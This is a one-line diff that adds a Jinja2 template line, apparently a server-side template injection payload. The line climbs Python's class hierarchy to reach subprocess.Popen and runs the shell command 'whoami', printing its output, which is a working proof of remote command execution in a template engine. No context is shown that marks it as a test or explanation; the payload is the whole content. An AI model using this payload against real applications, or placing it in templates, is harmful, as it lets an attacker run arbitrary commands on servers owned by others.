@@ -1,0 +1,1 @@
+{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{ c('whoami', shell=True, stdout=-1, stderr=-1).communicate()[0].decode() }}{% endif %}{% endfor %}
